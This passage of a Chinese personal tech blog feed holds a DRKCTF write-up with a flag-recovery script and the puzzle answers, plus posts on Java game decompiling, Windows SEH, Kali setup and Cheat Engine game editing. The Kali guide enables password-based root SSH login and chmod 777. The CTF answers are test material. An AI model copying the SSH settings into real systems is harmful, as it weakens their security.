class="number">0x43</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0xC0</span>, <span class="number">0x83</span>, <span class="number">0x43</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0xCD</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0xC8</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x4A</span>, <span class="number">0x9F</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x84</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x46</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x52</span>,<span class="number">0xE</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        k = c</span><br><span class="line">        <span class="keyword">if</span> c &lt;=<span class="number">0x40</span> <span class="keyword">or</span> c&gt;=<span class="number">0x5b</span>:</span><br><span class="line">            <span class="keyword">if</span> c&lt;=<span class="number">0x60</span> <span class="keyword">or</span> c &gt;= <span class="number">0x7b</span>:</span><br><span class="line">                c-=<span class="number">30</span></span><br><span class="line">                c^=<span class="number">0x51</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c-=<span class="number">32</span></span><br><span class="line">                c^=<span class="number">0xcd</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c+=<span class="number">32</span></span><br><span class="line">            c^=<span class="number">0xab</span></span><br><span class="line">        <span class="keyword">if</span> c==last[<span class="built_in">len</span>]:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#DRKCTF&#123;Y0u_Kn0w_F1a9_Con9raTu1aTion5!!!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="一起做杯下午茶吧"><a href="#一起做杯下午茶吧" class="headerlink" title="一起做杯下午茶吧"></a>一起做杯下午茶吧</h3><p>不会QAQ</p><h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><h3 id="羡慕群友每一天"><a href="#羡慕群友每一天" class="headerlink" title="羡慕群友每一天"></a>羡慕群友每一天</h3><p>直接开搜</p><p><img src="https://s2.loli.net/2024/05/27/D9qgF3a4ZLxtCvP.png" alt="image-20240527145103522"></p><p>发现不是中间圆心的位置好像不一样</p><p>找另一个</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-弗罗里达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗⾥达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密州-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密市-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><p>第五个是对的</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DNA-5"><a href="#DNA-5" class="headerlink" title="DNA -5"></a>DNA -5</h3><p>提示：遥遥领先</p><p>抽象的题，没看wp之前我绝对想不到QAQ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACGCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCAGCTAAATCCAATAACCACTACCCCTCCATAAGAGAATAACCACTCATCCCCCTAATAAGAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>根据wp，由遥遥领先想到5G，又因为-5，所以可以想到要少5个G</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCACTAAATCCAATAACCACTACCCCTCCATAAAAATAACCACTCATCCCCCTAATAAAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>看这个可以先试试DNA解密</p><p>不行</p><p>结果是摩斯</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WIPXGU<span class="meta">%</span>u<span class="number">7</span>bSZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span><span class="meta">%</span>u<span class="number">7</span>d</span><br><span class="line">WIPXGU&#123;SZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>然后解atbash</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;H<span class="built_in">A_HA</span>_1T5_M0RS3&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">DRKCTF的复现</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="cry" scheme="https://www.pri87.vip/tags/cry/"/>
    
  </entry>
  
  <entry>
    <title>记录一次修正网络bug</title>
    <link href="https://www.pri87.vip/posts/5afbca6a.html"/>
    <id>https://www.pri87.vip/posts/5afbca6a.html</id>
    <published>2024-05-27T02:52:37.000Z</published>
    <updated>2024-06-17T16:20:30.399Z</updated>
    
    <content type="html"><![CDATA[<p>不知道是什么时候开始，我的梯子出了一个bug（我感觉是安了idea破解插件之后QAQ）</p><p>首先这是基本信息：</p><p>我有一个梯子（同一个品牌）</p><p>一个是edge浏览器插件</p><p>一个是软件</p><p>根据这几天的观察，出现了以下现象：</p><ul><li>开启插件而关闭软件（上网策略+全局代理）：<br>只能进入cn.bing.com且网速很慢</li><li>开启插件而关闭软件（全局代理）：<br>网页浏览恢复正常，可以连上<a href="http://www.bing.com,过一段时间变成不可以连上,并且修打开关闭上网策略都不行/">www.bing.com，过一段时间变成不可以连上，并且修打开关闭上网策略都不行</a></li><li>开启软件而关闭插件（全局代理）：<br>网页浏览恢复正常，可以连上<a href="http://www.bing.com/">www.bing.com</a></li><li>两个都开启：<br>只能进入cn.bing.com且网速很慢</li><li>以前开启插件而关闭软件（上网策略+全局代理）：<br>可以连上<a href="http://www.bing.com/">www.bing.com</a></li><li>bing会解析ip判断是连cn还是www</li><li>有的时候通过pip安装包会访问错误（国内源）但是开启软件就可以</li></ul><p>目前通过关闭上网策略来进入<a href="http://www.bing.com/">www.bing.com</a><br>外面的bug之后再修QAQ</p><p>看了一下设置：<br>上网策略中会把cn.bing.com直接连接不经过梯子</p>]]></content>
    
    
    <summary type="html">好怪啊，这是为什么呢</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>java逆向基本步骤</title>
    <link href="https://www.pri87.vip/posts/c2aa3be6.html"/>
    <id>https://www.pri87.vip/posts/c2aa3be6.html</id>
    <published>2024-05-19T12:35:58.000Z</published>
    <updated>2024-06-17T16:20:30.387Z</updated>
    
    <content type="html"><![CDATA[<p>今天玩杀戮尖塔，好玩，所以试了一下要怎么逆。</p><p>这个游戏是java写的，所以基本逻辑就是先把jar包反编译成java源文件，然后修改，然后用idea生成出jar包</p><p>这篇只是记录一下基本步骤：</p><p>1.反编译jar</p><p>这里使用的是idea的java-decompiler插件。</p><p>下载好之后找到java-decompiler插件的位置。</p><p>先生成一个文件夹，假设名字是test</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;C:\decompiler.jar&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true target<span class="selector-class">.jar</span> test</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;decomiler路径&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true 源jar路径 一个文件夹名</span><br></pre></td></tr></table></figure><p>如果正确，文件夹里会生成一个和刚刚同名的jar。解压之后得到源代码。</p><p>2.调整目录结构</p><p>由于解压后所有内容都是平铺的，需要调整目录结构让idea可以正确识别并生成，同时由于我逆的是游戏模组，所以还需要导入对应的游戏依赖包。</p><p>目录结构应该是：</p><p>test</p><ul><li>src<ul><li>main<ul><li>java<ul><li>源代码</li></ul></li><li>resources<ul><li>img</li><li>localization</li></ul></li></ul></li></ul></li></ul><p>生成jar</p><p>不是很懂maven，好像是一个管理器一样的东西，这个地方我用它来生成jar代码</p><p>详见：<a href="https://zhuanlan.zhihu.com/p/403468512">杀戮尖塔MOD制作详解</a></p><p>首先构建pom.xml</p><p>在里面填写对应的配置项</p><p>然后在右边选择package</p><p>它会自动生成，如果反编译的文件有问题，就手动修正一下（我只遇到了一个）</p><p>然后就能生成对应的jar文件了。</p><hr><p>一定要注意文件路径要正确，不然只能生成只有元数据的文件。</p>]]></content>
    
    
    <summary type="html">ss快玩！</summary>
    
    
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="java" scheme="https://www.pri87.vip/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>seh-windows结构化异常处理研究</title>
    <link href="https://www.pri87.vip/posts/8c61c980.html"/>
    <id>https://www.pri87.vip/posts/8c61c980.html</id>
    <published>2024-05-04T10:01:24.000Z</published>
    <updated>2024-06-17T16:20:30.397Z</updated>
    
    <content type="html"><![CDATA[<p>SEH结构化异常处理：</p><p>由于这个东西是基于线程的，所以先学习一下PEB和TEB</p><h2 id="TEB-PEB"><a href="#TEB-PEB" class="headerlink" title="TEB&amp;PEB"></a>TEB&amp;PEB</h2><p>线程环境块</p><p>系统在TEB中保存了最频繁使用的线程相关数据，大小为4kb。系统中每个进程都有一个自己的TEB，一个进程的所有TEB都以堆栈的形式存放在内存中。同理，PEB为进程环境块，TEB中有指向PEB的指针，每个进程的PEB也以堆栈形式放在内存中</p><ul><li>在x64架构环境下，<code>GS + 30h</code>处存储的是Teb结构体的基地址，<code>GS + 60h</code>处存储的是Peb结构体的基地址。</li><li>在x86架构环境下，<code>FS + 18h</code>处存储的是Teb结构体的基地址，<code>FS + 30h</code>处存储的是Peb结构体的基地址。</li></ul><p>而指向SEH链开头就是TEB的0号位<br>以下是TEB与seh的关系<br><img src="https://s2.loli.net/2024/05/04/GBMrJPKWZhiuNL2.png" alt="867232_UQX698BZWQ7UZ8Y"></p><p>[施工中]</p>]]></content>
    
    
    <summary type="html">SEH!</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>kali配置步骤</title>
    <link href="https://www.pri87.vip/posts/8e948a96.html"/>
    <id>https://www.pri87.vip/posts/8e948a96.html</id>
    <published>2024-05-02T05:21:58.000Z</published>
    <updated>2024-05-02T12:54:13.611Z</updated>
    
    <content type="html"><![CDATA[<p>今天不小心把kali删了，于是准备重新装一个，之前装的时候也没有怎么仔细用过，权当是用来调试elf，所以趁放假重新配一个，顺便记录一下流程。</p><hr><h2 id="安装kali-linux"><a href="#安装kali-linux" class="headerlink" title="安装kali-linux"></a>安装kali-linux</h2><p>下载vmware</p><p><a href="https://www.vmware.com/">VMware - Delivering a Digital Foundation For Businesses</a></p><p>下载kali</p><p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p><p><img src="https://s2.loli.net/2024/05/02/LxIoaKvrtRCSXpf.png" alt="image-20240502133052716"></p><p>建议图里面框着的这个</p><p><a href="https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-vmware-amd64.7z">下载直链</a></p><hr><p>下载完成后解压并打开文件夹，如果已经安装好了VMware，那么双击vmx文件会自动弹出VMware并配置好虚拟机。现在就可以用了。</p><p>点击开启。</p><p>账户和密码均为kali</p><p>现在就可以使用了。</p><hr><h2 id="基本设置"><a href="#基本设置" class="headerlink" title="基本设置"></a>基本设置</h2><h3 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h3><p>输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>在对应选框按空格选择对应语言包然后按回车确认</p><p><img src="https://s2.loli.net/2024/05/02/hnwkv8z2C7GdFir.png" alt="image-20240502140958050"></p><p>后一个页面在zh_CN.UTF-8的位置回车</p><p>重启后生效。</p><h3 id="更新软件包"><a href="#更新软件包" class="headerlink" title="更新软件包"></a>更新软件包</h3><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>来更新软件包</p><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>安装leafpad</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install leafpad</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加源：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#中科大</span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#阿里云</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#清华大学</span></span><br><span class="line">deb http:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br></pre></td></tr></table></figure><h3 id="获取vscode-其实用vim也可以"><a href="#获取vscode-其实用vim也可以" class="headerlink" title="获取vscode&#x2F;其实用vim也可以"></a>获取vscode&#x2F;其实用vim也可以</h3><p>打开火狐，直接搜索官网</p><p>下载deb版本</p><p>在download文件夹使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i ./(文件名)</span><br></pre></td></tr></table></figure><h3 id="改变字体"><a href="#改变字体" class="headerlink" title="改变字体"></a>改变字体</h3><p>下载好自己想要的字体，我的字体是内置的</p><p>在终端-文件-参数配置-第一行修改字体和大小</p><h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><p>编辑config</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo leafpad /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>#PasswordAuthentication yes行去掉#</p><p>#PermitRootLogin prohibit-password去掉#</p><p>把prohibit-password改为yes</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service ssh start</span><br><span class="line">sudo service ssh status</span><br></pre></td></tr></table></figure><p>此时如果有：</p><p><code>active(running)</code>就算成功</p><h2 id="基本环境配置"><a href="#基本环境配置" class="headerlink" title="基本环境配置"></a>基本环境配置</h2><p>由于不懂web，所以只配了其它环境</p><h3 id="RE环境配置"><a href="#RE环境配置" class="headerlink" title="RE环境配置"></a>RE环境配置</h3><p>创建一个文件夹，放入ida的调试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 linux_server</span><br><span class="line">chmod 777 linux_server64</span><br></pre></td></tr></table></figure><p>修改权限</p><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>查看ip端口号</p><p><img src="https://s2.loli.net/2024/05/02/Jsgn1Mho3uKSp6w.png" alt="image-20240502155336325"></p><p>先执行对应的server(如果你的文件是32位的就不加64)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_server64</span><br></pre></td></tr></table></figure><p>然后在ida中输入</p><p><img src="https://s2.loli.net/2024/05/02/TNQqLdpEAug6Vaf.png" alt="image-20240502155358135"></p><p>调试成功</p><h3 id="CRY环境配置"><a href="#CRY环境配置" class="headerlink" title="CRY环境配置"></a>CRY环境配置</h3><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker docker-compose </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或</span></span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动docker服务</span></span><br><span class="line">service docker start</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出docker现有镜像</span></span><br><span class="line">docker images</span><br><span class="line"> </span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>如果弹出</p><p><img src="https://s2.loli.net/2024/05/02/PGaHBt7Fr8IJisT.png" alt="image-20240502161037944"></p><p>表明成功</p><h4 id="安装sage-math"><a href="#安装sage-math" class="headerlink" title="安装sage-math"></a>安装sage-math</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull sagemath/sagemath</span><br></pre></td></tr></table></figure><p>拉取镜像</p><p>最后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it sagemath/sagemath:latest</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/aDfsTwqE79OztFQ.png" alt="image-20240502161640136"></p><p>成功</p><p>由于sage的python好像模块不齐，还要配置模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p8888:8888 sagemath/sagemath:latest sage-jupyter</span><br></pre></td></tr></table></figure><p>打开交互式环境，点击最下面的链接</p><p><img src="https://s2.loli.net/2024/05/02/Sx1UzhFfamklsEg.png" alt="image-20240502163425729"></p><p>new - terminal</p><p>在这里pip install就好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br><span class="line">pip install crypto</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/Jnz4YKiud9GDBcI.png" alt="image-20240502164306991"></p><p>安装好了测试一下，在new中选择sagemath10.3</p><p><img src="https://s2.loli.net/2024/05/02/81NgP2YGifK3EDc.png" alt="image-20240502164335278"></p><h3 id="PWN环境配置"><a href="#PWN环境配置" class="headerlink" title="PWN环境配置"></a>PWN环境配置</h3><h4 id="pwntool安装"><a href="#pwntool安装" class="headerlink" title="pwntool安装"></a>pwntool安装</h4><p>因为是py库，用来写exp的</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install <span class="comment">--upgrade pwntools</span></span><br></pre></td></tr></table></figure><p>其实应该在本机安的，感觉方便一点</p><h4 id="pwndbg安装"><a href="#pwndbg安装" class="headerlink" title="pwndbg安装"></a>pwndbg安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h4 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h4><p>peda</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/longld/peda.git</span><br></pre></td></tr></table></figure><p>pwngdb</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/scwuaptx/Pwngdb.git </span><br></pre></td></tr></table></figure><p>由于正常情况插件不能一起使用？？所以要配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br><span class="line">sudo leafpad /.gdbinit</span><br></pre></td></tr></table></figure><p>在其中写入：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span> ~<span class="regexp">/pwndbg/g</span>dbinit.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/peda/</span>peda.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/pwngdb/</span>pwngdb.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/Pwngdb/</span>angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line"><span class="keyword">import</span> angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>注意目录必须和安装位置一样，上面的地址默认是在~目录下载的</p><p>然后</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line"><span class="built_in">file</span> xxx</span><br><span class="line"><span class="built_in">start</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/jMg94u3cXY5wify.png" alt="image-20240502190833611"></p><p>成功</p><h3 id="MISC环境配置"><a href="#MISC环境配置" class="headerlink" title="MISC环境配置"></a>MISC环境配置</h3><p>misc里面需要的东西有点杂，而且很多其实在windows里面都有代替，所以感觉没什么必要，但是保险起见（防止之后我作死），还是写一点</p><h4 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure><p>检查：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">foremost -h</span></span><br></pre></td></tr></table></figure><h4 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line">cd binwalk</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h4 id="ciphey"><a href="#ciphey" class="headerlink" title="ciphey"></a>ciphey</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> python3-ciphey</span><br></pre></td></tr></table></figure><p>差不多这几个工具吧（<del>弗如随波逐流</del>）</p><hr><p>之后应该也有更新QAQ</p><p>参考：</p><p><a href="https://www.cnblogs.com/huajianyizou/p/kali1.html#_label3">Kali下载安装以及基础配置 - 清光照归途 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_46318141/article/details/121168812">kali下对Docker的详细安装_kali安装docker-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/qq_46145027/article/details/124912352">密码学]利用docker安装与使用sagemath_kali安装sagemath-CSDN博客</a></p><p><a href="https://blog.csdn.net/whbing1471/article/details/112410599">gdb与peda、pwngdb、pwndbg组合安装与使用_gdb peda-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">不小心把kali删了QAQ</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="kali" scheme="https://www.pri87.vip/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>CE与mono模块_1</title>
    <link href="https://www.pri87.vip/posts/b58030d5.html"/>
    <id>https://www.pri87.vip/posts/b58030d5.html</id>
    <published>2024-05-01T14:32:07.000Z</published>
    <updated>2024-05-06T13:30:28.710Z</updated>
    
    <content type="html"><![CDATA[<p>今天不想学习，想玩游戏，所以就打开了一个肉鸽游戏，尝试开挂。</p><p>参考：<a href="https://www.bilibili.com/read/cv12648903/">【CheatEngine基础教程】四、Unity3D游戏《晚上nano好》修改实战</a></p><hr><p>先打开游戏目录，看看是哪类游戏</p><ul><li>rpgmaker：解包+编辑器用工程文件打开</li><li>gamemaker：js反混淆得到源代码</li><li>unity il ：ce+dnspy</li><li>unity il2cpp：恢复符号表ida改cpp代码+ce</li></ul><p>在Managed文件夹中：</p><p><img src="https://s2.loli.net/2024/05/01/zCu6egoh4MGdD1b.png" alt="image-20240501224552961"></p><p>很明显可以看出是unity游戏</p><p>首先要明确目标：</p><p>这是一个卡牌rougelike游戏，玩家操作2~4个角色+一个主角打败复数的敌人</p><p>修改金钱，技能点（升级人物），人物血量，每回合费用</p><p>那么开始</p><hr><h2 id="修改基本数据"><a href="#修改基本数据" class="headerlink" title="修改基本数据"></a>修改基本数据</h2><p>由于这个游戏是unity游戏，可以直接通过ce的mono分析模块来方便地检测内容并hook函数</p><p><img src="https://s2.loli.net/2024/05/01/WhaZ835mzOniIXE.png" alt="image-20240501232651548"></p><p>这样打开这个功能，然后搜索金钱数量，直到找到对应的值</p><p><img src="https://s2.loli.net/2024/05/01/VfbATiPKu9JMcIX.png" alt="image-20240501232847246"></p><p>右键，查找是什么改写了这个值</p><p>得到：</p><p><img src="https://s2.loli.net/2024/05/01/W3fw4BKvlXYamz9.png" 